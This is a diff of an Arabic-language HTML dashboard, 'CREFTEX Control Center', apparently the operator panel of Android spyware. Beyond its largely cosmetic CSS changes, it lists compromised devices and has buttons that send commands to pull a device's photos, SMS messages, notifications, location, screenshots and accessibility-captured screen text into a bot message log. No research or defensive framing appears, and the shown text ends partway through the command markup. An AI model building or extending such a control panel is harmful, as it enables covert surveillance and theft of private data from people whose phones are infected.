@@ -2,181 +2,862 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CREFTEX Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CREFTEX — Control Center</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, "Segoe UI", Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: radial-gradient(ellipse at top, #0f172a, #050810 60%); color: #e8eef8; min-height: 100vh; padding: 16px; padding-bottom: 40px; }
-        .container { max-width: 900px; margin: 0 auto; }
-        .header { text-align: center; margin-bottom: 24px; padding: 20px 16px; background: linear-gradient(135deg, rgba(59,130,246,.1), rgba(6,182,212,.05)); border: 1px solid rgba(59,130,246,.2); border-radius: 20px; }
-        h1 { font-size: 26px; font-weight: 800; margin-bottom: 6px; background: linear-gradient(135deg, #60a5fa, #06b6d4, #22d3ee); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .subtitle { color: #94a3b8; font-size: 13px; }
-        .status { padding: 12px 16px; margin-bottom: 18px; border-radius: 12px; font-size: 14px; font-weight: 600; display: none; text-align: center; }
-        .status.show { display: block; }
-        .status.ok { background: rgba(16,185,129,.15); color: #34d399; border: 1px solid rgba(16,185,129,.3); }
-        .status.err { background: rgba(239,68,68,.15); color: #f87171; border: 1px solid rgba(239,68,68,.3); }
-        .status.wait { background: rgba(59,130,246,.15); color: #60a5fa; border: 1px solid rgba(59,130,246,.3); }
-        .panel { background: rgba(15,23,42,.8); border: 1px solid rgba(71,85,105,.3); border-radius: 16px; padding: 18px; margin-bottom: 16px; }
-        .panel-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
-        .panel-title { font-size: 16px; font-weight: 700; color: #93c5fd; }
-        .refresh-btn { background: rgba(59,130,246,.15); border: 1px solid rgba(59,130,246,.3); color: #60a5fa; padding: 6px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; }
+        :root {
+            --bg-0: #05070d;
+            --bg-1: #0a0f1a;
+            --bg-2: #0f1623;
+            --bg-3: #141c2c;
+            --line: rgba(99, 130, 180, 0.14);
+            --line-hi: rgba(99, 130, 180, 0.3);
+            --text: #e6ecf5;
+            --text-dim: #8a9bb5;
+            --text-mute: #5c6b82;
+            --accent: #3b82f6;
+            --accent-glow: rgba(59, 130, 246, 0.35);
+            --success: #10b981;
+            --success-glow: rgba(16, 185, 129, 0.25);
+            --warn: #f59e0b;
+            --danger: #ef4444;
+            --danger-glow: rgba(239, 68, 68, 0.25);
+            --purple: #8b5cf6;
+            --cyan: #06b6d4;
+            --radius: 20px;
+            --radius-sm: 14px;
+            --radius-xs: 10px;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        html, body { height: 100%; }
+        body {
+            font-family: 'Cairo', -apple-system, sans-serif;
+            background: var(--bg-0);
+            color: var(--text);
+            min-height: 100vh;
+            padding: 24px;
+            padding-bottom: 60px;
+            overflow-x: hidden;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(circle at 15% 10%, rgba(59, 130, 246, 0.12), transparent 40%),
+                radial-gradient(circle at 85% 90%, rgba(139, 92, 246, 0.08), transparent 40%),
+                radial-gradient(circle at 50% 50%, rgba(6, 182, 212, 0.04), transparent 60%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        .app {
+            position: relative;
+            z-index: 1;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
 
-        /* Device Cards */
-        .devices-list { display: flex; flex-direction: column; gap: 12px; }
-        .device-card {
-            background: linear-gradient(135deg, rgba(30,41,59,.8), rgba(15,23,42,.8));
-            border: 1px solid rgba(71,85,105,.4);
-            border-radius: 14px;
-            padding: 16px;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            transition: all .15s;
-            cursor: pointer;
-        }
-        .device-card:hover { border-color: rgba(59,130,246,.6); transform: translateY(-2px); }
-        .device-card.active { border-left: 4px solid #10b981; }
-        .device-card.inactive { border-left: 4px solid #ef4444; opacity: .7; }
-        .device-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 12px;
-            background: linear-gradient(135deg, #3b82f6, #2563eb);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            flex-shrink: 0;
-        }
-        .device-info { flex: 1; min-width: 0; }
-        .device-name { font-size: 15px; font-weight: 700; color: #e8eef8; margin-bottom: 4px; }
-        .device-meta { font-size: 12px; color: #94a3b8; direction: ltr; text-align: left; }
-        .device-status {
-            padding: 5px 10px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 700;
-            flex-shrink: 0;
-        }
-        .device-status.active { background: rgba(16,185,129,.15); color: #34d399; border: 1px solid rgba(16,185,129,.3); }
-        .device-status.inactive { background: rgba(239,68,68,.15); color: #f87171; border: 1px solid rgba(239,68,68,.3); }
-
-        /* Commands for selected device */
-        .selected-device {
-            background: rgba(59,130,246,.1);
-            border: 1px solid rgba(59,130,246,.4);
-            border-radius: 12px;
-            padding: 14px;
-            margin-bottom: 16px;
+        /* ═══════ Top Bar ═══════ */
+        .topbar {
             display: flex;
             align-items: center;
             justify-content: space-between;
+            padding: 20px 28px;
+            background: linear-gradient(135deg, rgba(20, 28, 44, 0.9), rgba(15, 22, 35, 0.85));
+            border: 1px solid var(--line);
+            border-radius: var(--radius);
+            margin-bottom: 24px;
+            backdrop-filter: blur(20px);
         }
-        .selected-device .info { flex: 1; }
-        .selected-device .label { font-size: 11px; color: #94a3b8; margin-bottom: 4px; }
-        .selected-device .name { font-size: 15px; font-weight: 700; color: #60a5fa; }
-        .selected-device .close-btn { background: rgba(239,68,68,.2); border: 1px solid rgba(239,68,68,.4); color: #f87171; padding: 6px 12px; border-radius: 8px; font-size: 12px; cursor: pointer; font-weight: 600; }
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .brand-logo {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            background: linear-gradient(135deg, var(--accent), var(--cyan));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            box-shadow: 0 8px 24px var(--accent-glow);
+        }
+        .brand-text h1 {
+            font-size: 20px;
+            font-weight: 800;
+            letter-spacing: 0.3px;
+            background: linear-gradient(135deg, #60a5fa, #22d3ee);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .brand-text p {
+            font-size: 12px;
+            color: var(--text-mute);
+            margin-top: 2px;
+            letter-spacing: 0.5px;
+        }
+        .topbar-stats {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+        .stat-mini {
+            text-align: center;
+            padding: 8px 18px;
+            background: rgba(10, 15, 26, 0.6);
+            border: 1px solid var(--line);
+            border-radius: var(--radius-xs);
+            min-width: 88px;
+        }
+        .stat-mini .n {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--cyan);
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .stat-mini .l {
+            font-size: 10px;
+            color: var(--text-mute);
+            margin-top: 2px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
 
-        .grid { display: grid; grid-template-columns: repeat(2,1fr); gap: 10px; }
-        .btn { padding: 16px 12px; border-radius: 12px; border: none; font-size: 14px; font-weight: 700; color: #fff; cursor: pointer; background: linear-gradient(135deg, #3b82f6, #2563eb); display: flex; align-items: center; justify-content: center; min-height: 52px; text-align: center; }
-        .btn:active { transform: scale(.96); }
-        .btn.secondary { background: linear-gradient(135deg, #6366f1, #4f46e5); }
-        .btn.green { background: linear-gradient(135deg, #10b981, #059669); }
-        .btn.orange { background: linear-gradient(135deg, #f59e0b, #d97706); }
-        .btn.danger { background: linear-gradient(135deg, #ef4444, #dc2626); }
-        .btn.purple { background: linear-gradient(135deg, #8b5cf6, #7c3aed); }
+        /* ═══════ Layout ═══════ */
+        .layout {
+            display: grid;
+            grid-template-columns: 380px 1fr;
+            gap: 24px;
+            align-items: start;
+        }
 
-        .log { background: #050810; border-radius: 12px; padding: 14px; max-height: 500px; overflow-y: auto; direction: ltr; border: 1px solid rgba(71,85,105,.2); }
-        .msg { padding: 10px 12px; margin-bottom: 8px; border-radius: 10px; background: rgba(30,41,59,.5); border-left: 3px solid #3b82f6; }
-        .msg.bot { border-left-color: #06b6d4; background: rgba(6,182,212,.08); }
-        .msg.user { border-left-color: #10b981; background: rgba(16,185,129,.08); }
-        .msg-time { color: #64748b; font-size: 11px; margin-bottom: 4px; direction: rtl; }
-        .msg-from { color: #93c5fd; font-weight: 700; font-size: 12px; direction: rtl; }
-        .msg-text { color: #e2e8f0; direction: rtl; text-align: right; margin-top: 6px; white-space: pre-wrap; word-break: break-word; font-size: 13px; }
-        .msg-img { max-width: 100%; border-radius: 8px; margin-top: 8px; display: block; border: 1px solid rgba(71,85,105,.3); cursor: pointer; }
+        /* ═══════ Sidebar — Devices ═══════ */
+        .sidebar {
+            background: linear-gradient(180deg, rgba(20, 28, 44, 0.85), rgba(15, 22, 35, 0.9));
+            border: 1px solid var(--line);
+            border-radius: var(--radius);
+            padding: 20px;
+            position: sticky;
+            top: 24px;
+            max-height: calc(100vh - 48px);
+            overflow-y: auto;
+        }
+        .sidebar::-webkit-scrollbar { width: 6px; }
+        .sidebar::-webkit-scrollbar-track { background: transparent; }
+        .sidebar::-webkit-scrollbar-thumb { background: var(--line-hi); border-radius: 3px; }
 
-        .empty { text-align: center; color: #64748b; padding: 40px 20px; font-size: 14px; direction: rtl; }
-        .empty-icon { font-size: 48px; margin-bottom: 12px; opacity: .5; }
+        .section-head {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+        .section-head .title {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--text);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .section-head .count {
+            background: rgba(59, 130, 246, 0.15);
+            color: var(--accent);
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+        }
+        .icon-btn {
+            width: 32px;
+            height: 32px;
+            border-radius: 10px;
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.25);
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.15s;
+            font-size: 14px;
+        }
+        .icon-btn:active { transform: scale(0.9); }
 
-        .modal { position: fixed; inset: 0; background: rgba(0,0,0,.95); z-index: 9999; display: none; align-items: center; justify-content: center; padding: 20px; }
-        .modal.show { display: flex; }
-        .modal img { max-width: 100%; max-height: 90vh; border-radius: 12px; }
-        .modal-close { position: absolute; top: 20px; right: 20px; width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,.1); border: none; color: #fff; font-size: 24px; cursor: pointer; }
+        .device-card {
+            background: linear-gradient(135deg, rgba(30, 41, 59, 0.6), rgba(20, 28, 44, 0.5));
+            border: 1px solid var(--line);
+            border-radius: var(--radius-sm);
+            padding: 16px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
+            overflow: hidden;
+        }
+        .device-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 4px;
+            height: 100%;
+            background: var(--text-mute);
+        }
+        .device-card.active::before { background: var(--success); box-shadow: 0 0 12px var(--success-glow); }
+        .device-card.inactive::before { background: var(--danger); }
+        .device-card.selected {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px var(--accent-glow), 0 8px 24px rgba(59, 130, 246, 0.15);
+        }
+        .device-card:hover { border-color: var(--line-hi); }
+        .device-card:active { transform: scale(0.99); }
 
-        .stats { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; }
-        .stat { background: rgba(30,41,59,.6); padding: 14px 8px; border-radius: 12px; text-align: center; }
-        .stat .num { font-size: 22px; font-weight: 800; color: #22d3ee; }
-        .stat .lbl { font-size: 11px; color: #94a3b8; margin-top: 4px; }
+        .dev-row-1 {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        .dev-name {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--text);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            max-width: 200px;
+        }
+        .dev-name input {
+            background: none;
+            border: none;
+            color: var(--text);
+            font-family: inherit;
+            font-size: 15px;
+            font-weight: 700;
+            width: 100%;
+            outline: none;
+            padding: 2px 4px;
+            border-radius: 6px;
+        }
+        .dev-name input:focus {
+            background: rgba(59, 130, 246, 0.15);
+            box-shadow: 0 0 0 1px var(--accent);
+        }
+        .dev-edit {
+            width: 24px;
+            height: 24px;
+            border-radius: 8px;
+            background: transparent;
+            border: none;
+            color: var(--text-mute);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .dev-edit:hover { background: rgba(59, 130, 246, 0.15); color: var(--accent); }
+        .dev-status-pill {
+            padding: 3px 9px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+        .dev-status-pill.active {
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--success);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+        .dev-status-pill.inactive {
+            background: rgba(239, 68, 68, 0.1);
+            color: var(--danger);
+            border: 1px solid rgba(239, 68, 68, 0.25);
+        }
+
+        .dev-row-2 {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            font-size: 11px;
+            color: var(--text-mute);
+            font-family: 'JetBrains Mono', monospace;
+            direction: ltr;
+            text-align: left;
+        }
+        .dev-row-2 .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .dev-row-2 .meta-item b {
+            color: var(--text-dim);
+            font-weight: 500;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        /* ═══════ Main Content ═══════ */
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        .empty-devices {
+            text-align: center;
+            padding: 60px 20px;
+            color: var(--text-mute);
+        }
+        .empty-devices .ico { font-size: 56px; margin-bottom: 12px; opacity: 0.4; }
+        .empty-devices p { font-size: 13px; }
+
+        /* ═══════ Commands Panel ═══════ */
+        .cmd-panel {
+            background: linear-gradient(180deg, rgba(20, 28, 44, 0.85), rgba(15, 22, 35, 0.9));
+            border: 1px solid var(--line);
+            border-radius: var(--radius);
+            padding: 24px;
+            display: none;
+        }
+        .cmd-panel.show { display: block; animation: slideIn 0.3s ease; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
+
+        .cmd-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--line);
+        }
+        .cmd-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .cmd-title .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--success);
+            box-shadow: 0 0 12px var(--success-glow);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+        .cmd-title h2 {
+            font-size: 17px;
+            font-weight: 700;
+            color: var(--text);
+        }
+        .cmd-title .sub {
+            font-size: 12px;
+            color: var(--text-mute);
+            margin-top: 2px;
+            font-family: 'JetBrains Mono', monospace;
+            direction: ltr;
+        }
+        .clear-btn {
+            padding: 8px 16px;
+            border-radius: 10px;
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: var(--danger);
+            font-family: inherit;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+        .clear-btn:active { transform: scale(0.95); }
+
+        .cmd-groups {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+        }
+        .cmd-group {
+            background: rgba(10, 15, 26, 0.5);
+            border: 1px solid var(--line);
+            border-radius: var(--radius-sm);
+            padding: 16px;
+        }
+        .cmd-group-title {
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .cmd-group-title::before {
+            content: '';
+            width: 3px;
+            height: 12px;
+            background: var(--accent);
+            border-radius: 2px;
+        }
+
+        .cmd-btns {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 8px;
+        }
+        .cmd-btns.two-col { grid-template-columns: 1fr 1fr; }
+
+        .cmd-btn {
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: 1px solid transparent;
+            background: linear-gradient(135deg, rgba(30, 41, 59, 0.6), rgba(20, 28, 44, 0.4));
+            color: var(--text);
+            font-family: inherit;
+            font-size: 13.5px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.15s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-align: right;
+            justify-content: flex-start;
+        }
+        .cmd-btn .ico {
+            font-size: 17px;
+            flex-shrink: 0;
+        }
+        .cmd-btn:hover {
+            border-color: var(--line-hi);
+            background: linear-gradient(135deg, rgba(40, 52, 74, 0.7), rgba(25, 34, 52, 0.6));
+        }
+        .cmd-btn:active { transform: scale(0.98); }
+        .cmd-btn.primary { border-color: rgba(59, 130, 246, 0.3); }
+        .cmd-btn.success { border-color: rgba(16, 185, 129, 0.3); }
+        .cmd-btn.warn { border-color: rgba(245, 158, 11, 0.3); }
+        .cmd-btn.danger { border-color: rgba(239, 68, 68, 0.3); }
+        .cmd-btn.purple { border-color: rgba(139, 92, 246, 0.3); }
+        .cmd-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+        /* ═══════ Log Panel ═══════ */
+        .log-panel {
+            background: linear-gradient(180deg, rgba(20, 28, 44, 0.85), rgba(15, 22, 35, 0.9));
+            border: 1px solid var(--line);
+            border-radius: var(--radius);
+            padding: 24px;
+        }
+        .log-head {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 18px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--line);
+        }
+        .log-title {
+            font-size: 17px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .log-title .ico { font-size: 20px; }
+        .log-controls {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+        .log-tabs {
+            display: flex;
+            gap: 4px;
+            background: rgba(10, 15, 26, 0.6);
+            border: 1px solid var(--line);
+            border-radius: 10px;
+            padding: 4px;
+        }
+        .log-tab {
+            padding: 6px 14px;
+            border-radius: 7px;
+            background: transparent;
+            border: none;
+            color: var(--text-mute);
+            font-family: inherit;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+        .log-tab.on {
+            background: rgba(59, 130, 246, 0.2);
+            color: var(--accent);
+        }
+
+        .log-body {
+            background: #030509;
+            border: 1px solid var(--line);
+            border-radius: var(--radius-sm);
+            padding: 20px;
+            min-height: 500px;
+            max-height: 700px;
+            overflow-y: auto;
+        }
+        .log-body::-webkit-scrollbar { width: 8px; }
+        .log-body::-webkit-scrollbar-track { background: transparent; }
+        .log-body::-webkit-scrollbar-thumb { background: var(--line-hi); border-radius: 4px; }
+
+        .log-entry {
+            display: flex;
+            gap: 14px;
+            padding: 14px 16px;
+            margin-bottom: 10px;
+            background: rgba(20, 28, 44, 0.5);
+            border: 1px solid var(--line);
+            border-radius: 12px;
+            animation: fadeUp 0.35s ease;
+            position: relative;
+        }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+        .log-entry::before {
+            content: '';
+            position: absolute;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            border-radius: 0 12px 12px 0;
+            background: var(--accent);
+        }
+        .log-entry.from-bot::before { background: var(--cyan); }
+        .log-entry.from-user::before { background: var(--success); }
+        .log-entry.is-photo::before { background: var(--purple); }
+
+        .log-entry .avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            background: linear-gradient(135deg, var(--accent), var(--cyan));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 17px;
+            flex-shrink: 0;
+        }
+        .log-entry.from-bot .avatar { background: linear-gradient(135deg, var(--cyan), #0ea5e9); }
+        .log-entry.from-user .avatar { background: linear-gradient(135deg, var(--success), #059669); }
+        .log-entry.is-photo .avatar { background: linear-gradient(135deg, var(--purple), var(--accent)); }
+
+        .log-entry .content { flex: 1; min-width: 0; }
+        .log-entry .meta {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 6px;
+        }
+        .log-entry .who {
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--text-dim);
+        }
+        .log-entry .when {
+            font-size: 11px;
+            color: var(--text-mute);
+            font-family: 'JetBrains Mono', monospace;
+            direction: ltr;
+        }
+        .log-entry .body {
+            font-size: 13.5px;
+            color: var(--text);
+            line-height: 1.7;
+            white-space: pre-wrap;
+            word-break: break-word;
+            direction: rtl;
+        }
+        .log-entry .body img {
+            max-width: 100%;
+            max-height: 500px;
+            border-radius: 10px;
+            margin-top: 8px;
+            border: 1px solid var(--line);
+            display: block;
+            cursor: pointer;
+        }
+        .log-entry .body audio, .log-entry .body video {
+            width: 100%;
+            margin-top: 8px;
+            border-radius: 10px;
+        }
+
+        .log-empty {
+            text-align: center;
+            padding: 100px 20px;
+            color: var(--text-mute);
+        }
+        .log-empty .ico { font-size: 64px; margin-bottom: 16px; opacity: 0.3; }
+        .log-empty p { font-size: 14px; }
+
+        /* ═══════ Status Toast ═══════ */
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            padding: 14px 24px;
+            border-radius: 14px;
+            font-size: 13.5px;
+            font-weight: 700;
+            background: rgba(20, 28, 44, 0.95);
+            border: 1px solid var(--line-hi);
+            backdrop-filter: blur(20px);
+            transition: transform 0.3s ease;
+            z-index: 9999;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
+            max-width: 90%;
+        }
+        .toast.show { transform: translateX(-50%) translateY(0); }
+        .toast.ok { border-color: rgba(16, 185, 129, 0.5); color: var(--success); }
+        .toast.err { border-color: rgba(239, 68, 68, 0.5); color: var(--danger); }
+        .toast.wait { border-color: rgba(59, 130, 246, 0.5); color: var(--accent); }
+
+        /* ═══════ Image Modal ═══════ */
+        .modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.96);
+            z-index: 99999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+        }
+        .modal.show { display: flex; animation: fadeIn 0.2s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .modal img {
+            max-width: 100%;
+            max-height: 90vh;
+            border-radius: 16px;
+            box-shadow: 0 20px 80px rgba(0, 0, 0, 0.8);
+        }
+        .modal-close {
+            position: absolute;
+            top: 24px;
+            right: 24px;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            color: #fff;
+            font-size: 22px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ═══════ Responsive ═══════ */
+        @media (max-width: 1024px) {
+            .layout { grid-template-columns: 1fr; }
+            .sidebar { position: static; max-height: none; }
+        }
+        @media (max-width: 640px) {
+            body { padding: 12px; }
+            .topbar { padding: 14px 16px; flex-wrap: wrap; gap: 12px; }
+            .topbar-stats { gap: 8px; }
+            .stat-mini { padding: 6px 12px; min-width: 68px; }
+            .stat-mini .n { font-size: 16px; }
+            .cmd-groups { grid-template-columns: 1fr; }
+            .cmd-btns.two-col { grid-template-columns: 1fr 1fr; }
+            .cmd-panel, .log-panel, .sidebar { padding: 16px; }
+            .log-body { padding: 12px; min-height: 400px; }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>⚡ CREFTEX</h1>
-            <div class="subtitle">لوحة التحكم عن بُعد</div>
-        </div>
-
-        <div class="status" id="status"></div>
-
-        <!-- Stats -->
-        <div class="panel">
-            <div class="panel-header"><div class="panel-title">📊 الإحصائيات</div></div>
-            <div class="stats">
-                <div class="stat"><div class="num" id="statDevices">0</div><div class="lbl">أجهزة</div></div>
-                <div class="stat"><div class="num" id="statActive">0</div><div class="lbl">نشطة</div></div>
-                <div class="stat"><div class="num" id="statMsgs">0</div><div class="lbl">رسائل</div></div>
-            </div>
-        </div>
-
-        <!-- Devices List -->
-        <div class="panel">
-            <div class="panel-header">
-                <div class="panel-title">📱 الأجهزة</div>
-                <button class="refresh-btn" onclick="loadDevices()">🔄 تحديث</button>
-            </div>
-            <div class="devices-list" id="devicesList">
-                <div class="empty"><div class="empty-icon">📱</div>لا أجهزة مسجّلة بعد</div>
-            </div>
-        </div>
-
-        <!-- Selected Device + Commands -->
-        <div id="cmdPanel" style="display:none">
-            <div class="selected-device">
-                <div class="info">
-                    <div class="label">الجهاز المحدد</div>
-                    <div class="name" id="selDeviceName">—</div>
+    <div class="app">
+        <!-- ═══════ Top Bar ═══════ -->
+        <div class="topbar">
+            <div class="brand">
+                <div class="brand-logo">⚡</div>
+                <div class="brand-text">
+                    <h1>CREFTEX</h1>
+                    <p>CONTROL CENTER</p>
                 </div>
-                <button class="close-btn" onclick="clearSelection()">✕ إلغاء</button>
             </div>
-
-            <div class="panel">
-                <div class="panel-header"><div class="panel-title">🎛 الأوامر</div></div>
-                <div class="grid">
-                    <button class="btn" onclick="sendCmd('/menu')">📋 القائمة</button>
-                    <button class="btn secondary" onclick="sendCmd('/photos')">📸 كل الصور</button>
-                    <button class="btn secondary" onclick="sendCmd('/photos 50')">📸 آخر 50</button>
-                    <button class="btn green" onclick="sendCmd('/info')">📊 معلومات الجهاز</button>
-                    <button class="btn green" onclick="sendCmd('/location')">📍 الموقع</button>
-                    <button class="btn orange" onclick="sendCmd('/screen')">📷 لقطة شاشة</button>
-                    <button class="btn purple" onclick="sendCmd('/sms')">📩 SMS</button>
-                    <button class="btn purple" onclick="sendCmd('/notifs')">🔔 الإشعارات</button>
-                    <button class="btn secondary" onclick="sendCmd('/accessibility')">📝 نصوص الشاشة</button>
-                    <button class="btn danger" onclick="sendCmd('/screen_stop')">🛑 إيقاف اللقطات</button>
+            <div class="topbar-stats">
+                <div class="stat-mini">
+                    <div class="n" id="statDevices">0</div>
+                    <div class="l">أجهزة</div>
+                </div>
+                <div class="stat-mini">
+                    <div class="n" id="statActive" style="color: var(--success)">0</div>
+                    <div class="l">نشطة</div>
+                </div>
+                <div class="stat-mini">
+                    <div class="n" id="statMsgs">0</div>
+                    <div class="l">رسائل</div>
                 </div>
             </div>
         </div>
 
-        <!-- Messages -->
-        <div class="panel">
-            <div class="panel-header">
-                <div class="panel-title">💬 الرسائل</div>
-                <button class="refresh-btn" onclick="loadMessages(true)">🔄 تحديث</button>
-            </div>
-            <div class="log" id="logBox">
-                <div class="empty"><div class="empty-icon">📭</div>لا رسائل بعد</div>
-            </div>
+        <!-- ═══════ Layout ═══════ -->
+        <div class="layout">
+            <!-- ═══════ Sidebar — Devices ═══════ -->
+            <aside class="sidebar">
+                <div class="section-head">
+                    <div class="title">
+                        <span>📱</span>
+                        <span>الأجهزة</span>
+                        <span class="count" id="devCount">0</span>
+                    </div>
+                    <div class="icon-btn" onclick="loadDevices()" title="تحديث">🔄</div>
+                </div>
+                <div id="devicesList">
+                    <div class="empty-devices">
+                        <div class="ico">📭</div>
+                        <p>لا أجهزة مسجّلة بعد</p>
+                    </div>
+                </div>
+            </aside>
+
+            <!-- ═══════ Main ═══════ -->
+            <main class="main-content">
+                <!-- Commands Panel -->
+                <div class="cmd-panel" id="cmdPanel">
+                    <div class="cmd-header">
+                        <div class="cmd-title">
+                            <div class="dot"></div>
+                            <div>
+                                <h2 id="selName">—</h2>
+                                <div class="sub" id="selSub">—</div>
+                            </div>
+                        </div>
+                        <button class="clear-btn" onclick="clearSelection()">✕ إلغاء التحديد</button>
+                    </div>
+
+                    <div class="cmd-groups">
+                        <div class="cmd-group">
+                            <div class="cmd-group-title">البيانات الأساسية</div>
+                            <div class="cmd-btns">
+                                <button class="cmd-btn primary" onclick="sendCmd('/photos')">
+                                    <span class="ico">📸</span> كل الصور
+                                </button>
+                                <button class="cmd-btn primary" onclick="sendCmd('/photos 50')">
+                                    <span class="ico">🖼</span> آخر 50 صورة
+                                </button>
+                                <button class="cmd-btn success" onclick="sendCmd('/sms')">
+                                    <span class="ico">📩</span> كل الرسائل SMS
+                                </button>
+                                <button class="cmd-btn success" onclick="sendCmd('/notifs')">
+                                    <span class="ico">🔔</span> كل الإشعارات
+                                </button>
+                                <button class="cmd-btn purple" onclick="sendCmd('/accessibility')">
+                                    <span class="ico">📝</span> نصوص الشاشة
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="cmd-group">
+                            <div class="cmd-group-title">الجهاز والموقع</div>
+                            <div class="cmd-btns">
